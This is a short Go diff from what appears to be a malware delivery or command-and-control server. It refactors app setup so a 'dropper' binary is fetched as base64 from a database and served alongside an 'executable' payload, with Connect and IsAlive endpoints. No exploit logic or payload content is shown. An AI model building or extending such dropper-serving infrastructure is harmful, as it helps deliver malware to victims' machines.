@@ -8,6 +8,7 @@ import (
 	"main/src/api/shared"
 	"main/src/api/shared/io"
 	"main/src/api/variables"
+	GetDropper2 "main/src/application/useCases/GetDropper"
 	"main/src/infrastructure/database"
 )
 
@@ -22,21 +23,30 @@ type App struct {
 func BuildApp() (App, error) {
 	configVariables := variables.GetConfig()
 
-	db := database.Database{
-		Db: database.CreateDatabaseConnection(configVariables),
+	database := database.Database{
+		Config: configVariables,
+	}
+
+	binaryAsB64, err := database.GetDropperBinary()
+
+	if err != nil {
+		return App{}, err
 	}
 
 	return App{
-		Database:          db,
+		Database:          database,
 		ConnectController: Connect.ConnectController{},
 		GetDropperController: GetDropper.GetDropperController{
-			Payload: io.Payload{
-				Bytes: shared.GetPayloadFromDisk(configVariables.DropperPath),
+			UseCase: GetDropper2.GetDropperUseCase{
+				Database: database,
+				Payload: io.Payload{
+					BytesAsB64: binaryAsB64,
+				},
 			},
 		},
 		GetExecutableController: GetExecutable.GetExecutableController{
 			Payload: io.Payload{
-				Bytes: shared.GetPayloadFromDisk(configVariables.ExecutablePath),
+				BytesAsB64: shared.GetPayloadFromDisk(configVariables.ExecutablePath),
 			},
 		},
 		IsAliveController: IsAlive.IsAliveController{},
